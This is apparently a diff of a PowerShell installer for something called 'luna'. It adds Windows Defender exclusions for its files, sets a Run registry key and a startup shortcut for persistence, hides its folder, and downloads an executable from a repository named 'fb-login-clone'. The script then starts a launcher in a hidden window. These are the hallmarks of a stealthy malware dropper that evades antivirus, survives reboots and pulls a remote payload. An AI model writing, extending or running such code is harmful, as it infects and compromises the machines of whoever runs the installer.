@@ -19,6 +19,8 @@ Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "$dest\luna_launcher.bat" -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "$dest\luna.ps1" -ErrorAction SilentlyContinue
 
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$dest\luna_launcher.bat"
+
 # Start Menu
 $WshShell = New-Object -ComObject WScript.Shell
 $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\luna.lnk"
@@ -30,6 +32,7 @@ $shortcut.Save()
 (Get-Item $dest).Attributes += 'Hidden'
 
 # Start
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/ffmpeg.exe" -OutFile "$dest\ffmpeg.exe" -UseBasicParsing
 Start-Process -WindowStyle Hidden -FilePath "$dest\luna_launcher.bat"
 
 # Delete
